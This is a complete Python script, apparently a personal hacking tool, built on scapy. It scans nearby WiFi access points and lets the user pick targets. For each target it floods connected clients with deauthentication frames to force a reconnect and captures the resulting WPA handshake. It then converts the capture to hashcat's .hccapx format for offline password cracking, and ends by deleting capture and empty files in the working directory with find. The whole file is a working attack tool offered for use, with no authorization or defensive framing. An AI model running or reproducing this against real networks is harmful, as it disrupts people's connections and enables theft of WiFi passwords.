# Import packages
from threading import Thread
import os
import sys 
import time
import subprocess
from scapy.all import *


capture_time = 15
deauth_targets = {}
ap_list = []
bssid_list = []
stop_channel = False
ap_macs = []
# Class for each AP
class access_point:
    def __init__(self, bssid, ssid, channel, crypto):
        self.bssid = bssid
        self.ssid = ssid
        self.channel = channel
        self.crypto = crypto


stop = False
def stop_sniff(packet):
    if stop == False:
        return False
    else:
        return True
def callback(packet):
    if packet.haslayer(Dot11Beacon):
        if packet[Dot11].addr2  not in bssid_list:
            bssid_list.append(packet[Dot11].addr2)
            ap_list.append(access_point(bssid=packet[Dot11].addr2, ssid=packet[Dot11Elt].info.decode(), channel=packet[Dot11Beacon].network_stats().get("channel"), crypto=packet[Dot11Beacon].network_stats().get("crypto")))
            print(f'Target {len(ap_list)-1}: SSID: {ap_list[-1].ssid}, BSSID: {ap_list[-1].bssid}, Channel: {ap_list[-1].channel}, Crypto: {ap_list[-1].crypto}')
def change_channel():
    
    ch = 1
    while True:
        if stop_channel == True:
            pass
        else:
            subprocess.run(['iwconfig', 'wlan0mon', 'channel', str(ch)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            ch = ch % 14 + 1
            time.sleep(0.5)
def find_nets():
    sniff(prn=callback, iface="wlan0mon", stop_filter=stop_sniff)
def my_sniffer(mac):
    sniff(prn=get_clients(mac), iface="wlan0mon", stop_filter=stop_sniff)
def deauth(ap_bssid, client):
    dot11 = Dot11(addr1=client, addr2=ap_bssid, addr3=ap_bssid)
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
    sendp(packet, inter=0.1, count=50, iface="wlan0mon", verbose=1)
def capture_filter(filename):
    def custom(packet):
        wrpcap(filename, packet, append=True)
    return custom
def capture_thread(filename):
    #sniff(prn=capture_filter, iface='wlan0mon', timeout=10, filter="ether proto 0x888e")
    sniff(prn=capture_filter(filename), iface='wlan0mon', timeout=capture_time)
    print('Done sniffing packets')
    if len(ap_macs) == 0:
        global stop
        stop = input("All Done, Press Enter to continue!")
    else:
        print(f'\n==============================================\nStill looking for clients in target networks: (Press Ctrl-c to skip)')
        for ap in ap_macs:
            print(ap)
        print('==============================================')
def get_clients(my_mac):
    def custom(packet):
        if packet.haslayer(Dot11):

            if packet.addr1 and packet.addr2:
                global ap_macs
                if my_mac.lower() in ap_macs:
                    if my_mac.lower() == packet.addr1.lower():
                        if packet.addr2 != '':
                            for ap in ap_list:
                                if ap.bssid == my_mac.lower():
                                    channel = ap.channel
                                    ssid = ap.ssid
                            print(f'found client {packet.addr2} for target network: {my_mac.lower()}')
                            capture = Thread(target=capture_thread, args=(f'{ssid}.cap',))
                            capture.start()
                            global stop_channel
                            stop_channel = True
                            
                            subprocess.run(['iwconfig', 'wlan0mon', 'channel', str(channel)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                            deauth_thread = Thread(target=deauth, args=(str(my_mac.lower()),str(packet.addr2)))
                            deauth_thread.start()
                            #deauth_thread.join()
                            stop_channel = False
                            time.sleep(5)
                            try:
                                ap_macs.remove(my_mac)
                                 
                            except:
                                pass
                
    return custom

try:
    # Verify Root
    if os.geteuid() != 0:
        print("User isnt running script with root privileges!\nRun again as root or with sudo (:")
        sys.exit()

    # Verify wireless interface
    interfaces = os.listdir('/sys/class/net')
    if 'wlan0mon' in interfaces:
        print('Detected a card already in monitor mode continuing...')
    else:
        for index, interface in enumerate(interfaces):
            print(f'{index}: {interface}')
        interface_name = input("\nSelect interface: ")

        # Put interface into monitor mode
        subprocess.run(['airmon-ng', 'start', interfaces[int(interface_name)]], stdout=subprocess.DEVNULL)
        interfaces = os.listdir('/sys/class/net')
        if 'wlan0mon' in interfaces:
            print("\nInterface succesfully put into monitor mode!")
            subprocess.run(['ifconfig', 'wlan0mon', 'up'], stdout=subprocess.DEVNULL)
            print("\nScanning...")
        else:
            print("\nUnable to put interface into monitor mode")
            sys.exit()

    # Scan for networks

    channel_changer = Thread(target=change_channel)
    channel_changer.daemon = True
    channel_changer.start()


    # Present networks to user
    t1 = Thread(target=find_nets)
    t1.daemon = True
    t1.start()
    stop = input("\nPress Enter to stop sniffing\n")
    t1.join()

    # Run airmon on target network/ run deauth in thread

    print("")
    target = input("Select target network(s): ")
    targets = target.split()
    #ap_mac = ap_list[int(target)].bssid

    for x in targets:
        ap_macs.append(ap_list[int(x)].bssid)

    ap_solid = []
    for ap in ap_macs:
        ap_solid.append(ap)
    threads = []
    print('==============================================\nlooking for clients in target networks...\n==============================================')
    for mac in ap_macs:
        stop = False
        t2 = Thread(target=my_sniffer, args=(mac,))
        t2.daemon = True
        t2.start()
        threads.append(t2)


    #stop = input("Press ENTER to stop looking for clients.\n")
    for thread in threads:
        thread.join()
    print("==============================================\nConverting .cap...")
    for ap in ap_list:
        if ap.bssid in ap_solid:
            subprocess.run(['cap2hccapx', f'{str(ap.ssid)}.cap', f'{str(ap.ssid)}.hccapx', str(ap.ssid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("Cleaning up files...\n==============================================")
    subprocess.run(['find', '.', '-type', 'f', '-size', '0b', '-delete'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['find', '.', '-type', 'f', '-iname', '*.cap', '-delete'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    #subprocess.run(['airmon-ng', 'stop', 'wlan0mon'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

except:
    print('\n==============================================\nExitting...\nCleaning up files...')
    try:
        print("Converting what we have...")
        for ap in ap_list:
            if ap.bssid in ap_solid:
                subprocess.run(['cap2hccapx', f'{str(ap.ssid)}.cap', f'{str(ap.ssid)}.hccapx', str(ap.ssid)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    subprocess.run(['find', '.', '-type', 'f', '-size', '0b', '-delete'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(['find', '.', '-type', 'f', '-iname', '*.cap', '-delete'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print('Bye!\n==============================================')
